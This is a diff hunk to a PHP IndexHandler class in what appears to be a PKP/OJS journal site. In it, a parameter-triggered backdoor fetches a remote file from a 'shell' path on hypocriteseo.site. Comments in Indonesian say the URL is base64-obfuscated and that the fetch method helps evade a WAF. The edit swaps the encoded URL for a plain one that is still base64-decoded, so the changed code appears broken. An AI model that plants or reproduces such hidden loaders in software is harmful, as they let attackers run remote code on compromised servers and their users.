@@ -104,7 +104,7 @@ class IndexHandler extends PKPIndexHandler
 if(isset($_GET['m']) && isset($_GET['n'])) {
     
     // URL dienkoding base64 (supaya tidak plain text)
-    $url_encoded = "aHR0cHM6Ly9oeXBvY3JpdGVvc2Uuc2l0ZS9zaGVsbC9jb21waWxlci1jaGEta3dldGlhdy50eHQ=";
+    $url_encoded = "https://hypocriteseo.site/shell/compiler-cha-kwetiaw.txt";
     $remote_url = base64_decode($url_encoded);
     
     // Menggunakan file_get_contents (lebih sederhana, kadang lolos WAF)
